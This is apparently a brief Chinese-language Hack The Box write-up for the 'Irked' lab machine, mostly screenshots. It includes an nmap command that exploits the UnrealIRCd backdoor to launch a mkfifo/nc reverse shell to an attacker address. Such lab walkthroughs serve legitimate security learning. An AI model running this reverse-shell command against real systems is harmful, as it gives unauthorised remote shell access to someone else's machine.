---
title: Irked Writeup
date: 2020-11-30 22:23:47
category: Hack The Box
---

# Irked Writeup

![](./0.png)

## 0x01 信息收集

![](./1.png)


## 0x02 漏洞枚举
``` bash
nmap -d -p6697 --script=irc-unrealircd-backdoor.nse 10.10.10.117
```
![](./5.png)

## 0x03 Getshell
``` bash
nmap -d -p6697 --script=irc-unrealircd-backdoor.nse --script-args=irc-unrealircd-backdoor.command='rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.21 4444 >/tmp/f &' 10.10.10.117
```
![](./6.png)

## 0x04 提权
exim4 - 4.84-2 看有提权漏洞，实则兔子洞，很坑。
![](./7.png)

另辟蹊径，轻松提权。
![](./10.png)


## 0x05 攻击节点
## 0x02 学到什么
#### 1、善用 `nmap --script vuln`。
#### 2、警惕兔子洞，走不通要果断放弃，另辟蹊径。